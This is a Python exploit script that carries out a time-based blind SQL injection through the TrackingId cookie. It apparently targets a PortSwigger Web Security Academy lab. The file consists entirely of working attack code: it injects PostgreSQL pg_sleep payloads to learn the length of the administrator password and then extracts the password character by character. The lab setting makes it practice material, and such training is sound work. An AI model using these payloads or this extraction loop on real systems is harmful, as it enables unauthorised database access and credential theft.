from pwn import *
import requests
import string
from colorama import Fore

p1 = log.progress("obteniendo el tamaño de la contraseña")
p2 = log.progress("Iniciando ataque basado en tiempo")


def get_length(url):

    for number in range(1,200):
        cookies = {
            "TrackingId": f"'%3b SELECT CASE WHEN (SELECT length(password) FROM users where username = 'administrator')={number} THEN pg_sleep(0.5) ELSE pg_sleep(0) END--",
            "session": "TrNyijGbvZgzNBlic4tVqe60op0JsAVS"
        }
        r = requests.get(url=url,cookies=cookies)
        p1.status(cookies["TrackingId"])

        if r.elapsed.total_seconds() > 0.3:
            p1.status(Fore.GREEN + f"Tamaño de la contraseña: {number}" + Fore.RESET)
            return number
    

def get_password(url):
    password_length = get_length(url)
    characters = string.ascii_letters + string.digits
    password = ""
    for position in range(1,password_length + 1):

        for character in characters:

            cookies = {
                "TrackingId": f"'%3b SELECT CASE WHEN (SELECT substring(password,{position},1) FROM users where username = 'administrator')= '{character}' THEN pg_sleep(0.5) ELSE pg_sleep(0) END--",
                "session": "TrNyijGbvZgzNBlic4tVqe60op0JsAVS"
            }

            r = requests.get(url=url,cookies=cookies)
            p2.status(password + str(character))
            
            if r.elapsed.total_seconds() > 0.3:
                password += str(character)
                p2.status(Fore.GREEN + password + Fore.RESET )
                break
            




get_password("https://0a9100310426698680d1355b00e200f3.web-security-academy.net/")